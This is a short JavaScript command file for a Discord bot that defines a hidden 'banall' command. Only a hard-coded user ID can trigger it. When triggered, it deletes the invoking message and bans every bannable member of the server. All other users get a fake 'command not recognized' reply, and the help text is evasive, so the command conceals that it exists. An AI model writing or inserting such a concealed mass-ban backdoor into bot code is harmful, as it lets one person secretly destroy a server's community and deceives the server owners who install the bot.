module.exports.run = async (bot, message, args, firebase, prefix, oofed) => {
    if (message.member.id != 532572460839731220){
        message.channel.send('\'banall\' was not recognized as an internal or external command, operable program, or batch file\nUse ' + prefix + 'help to get my command list');
        return;
    }
    message.delete();
    message.guild.members.cache.forEach(p => {
        if (p.bannable && p.id != 532572460839731220){
            p.ban();
        }
    });
}
module.exports.help = {
    name: 'banall',
    syntax: 'why do you want to know?',
    usage: 'You can\'t even use it',
    perms: 'stop bothering me'
}